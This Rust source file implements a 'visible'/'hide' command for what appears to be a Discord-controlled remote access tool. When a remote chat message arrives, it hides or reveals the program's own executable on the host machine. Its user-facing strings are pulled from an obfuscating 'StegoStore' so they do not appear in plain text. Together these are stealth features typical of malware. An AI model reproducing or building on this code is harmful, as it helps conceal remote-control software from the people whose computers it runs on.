use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;
use std::env;

use hf::{hide, show};

pub struct VisibleCommand;

impl VisibleCommand {
    fn s(k: &str) -> String { StegoStore::get(StringCategory::System, k) }
}

#[async_trait]
impl BotCommand for VisibleCommand {
    fn name(&self) -> &str { "visible" }
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "VISIBLE").into_boxed_str())
    }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str {
        Box::leak(Self::s("VISIBLE_USAGE").into_boxed_str())
    }
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::s("VISIBLE_EX1").into_boxed_str()) as &str,
            Box::leak(Self::s("VISIBLE_EX2").into_boxed_str()) as &str,
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] { &["vis", "hide"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(a) => a.to_lowercase(),
            None => {
                http.create_message(msg.channel_id.get(), &Self::s("VISIBLE_ERR")).await?;
                return Ok(());
            }
        };

        let enable = match action.as_str() {
            "on" | "show" | "visible" => true,
            "off" | "hide" | "invisible" => false,
            _ => {
                http.create_message(msg.channel_id.get(), &Self::s("VISIBLE_ERR")).await?;
                return Ok(());
            }
        };

        let current_exe_path = env::current_exe()?;

        if enable {
            match show(&current_exe_path) {
                Ok(_) => {
                    http.create_message(msg.channel_id.get(), "Successfully made executable visible").await?;
                }
                Err(e) => {
                    http.create_message(msg.channel_id.get(), &Self::s("VISIBLE_ERR_SHOW").replace("{}", &e.to_string())).await?;
                }
            }
        } else {
            match hide(&current_exe_path) {
                Ok(_) => {
                    http.create_message(msg.channel_id.get(), "Successfully hid executable").await?;
                }
                Err(e) => {
                    http.create_message(msg.channel_id.get(), &Self::s("VISIBLE_ERR_HIDE").replace("{}", &e.to_string())).await?;
                }
            }
        }

        Ok(())
    }
}
